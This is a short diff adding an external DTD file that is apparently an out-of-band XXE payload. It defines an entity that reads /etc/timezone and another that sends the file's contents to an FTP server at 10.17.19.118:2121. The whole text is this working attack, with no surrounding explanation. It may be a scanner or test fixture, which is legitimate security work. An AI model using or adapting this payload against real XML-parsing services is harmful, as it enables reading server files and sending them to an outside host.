@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/timezone">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://10.17.19.118:2121/?xxe=%file;'>">
+%eval;
+%exfiltrate;
